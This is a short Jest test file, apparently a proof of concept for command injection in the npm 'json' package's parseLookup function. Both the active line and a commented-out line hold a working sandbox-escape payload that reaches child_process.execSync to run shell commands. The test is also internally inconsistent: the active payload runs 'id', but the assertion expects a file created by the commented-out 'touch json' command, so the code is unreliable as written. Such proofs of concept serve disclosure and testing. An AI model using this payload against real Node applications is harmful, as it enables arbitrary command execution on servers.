// const json = require('json');

// 	res = json.parseLookup('{[this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch json").toString()]}');console.log(res);

test("Command Injection in json", () => 
{
	const json = require('json');
	const fs = require('fs');
	const path = './json';
	const sleep = require('sleep');	

	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    	
	// res = json.parseLookup(`{[this.constructor.constructor("return process")().binding('fs').open()]}`);
	res = json.parseLookup('{[this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()]}');
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
